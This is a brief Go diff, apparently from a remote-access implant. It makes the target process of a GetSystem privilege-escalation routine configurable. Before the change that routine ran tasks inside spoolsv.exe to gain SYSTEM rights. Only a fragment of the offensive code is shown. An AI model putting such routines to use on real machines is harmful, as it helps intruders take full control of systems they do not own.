@@ -391,8 +391,7 @@ func Elevate() (err error) {
 }
 
 // GetSystem starts a new RemoteTask in a SYSTEM owned process
-func GetSystem(data []byte) (err error) {
-	hostingProcess := "spoolsv.exe"
+func GetSystem(data []byte, hostingProcess string) (err error) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 	procs, _ := ps.Processes()
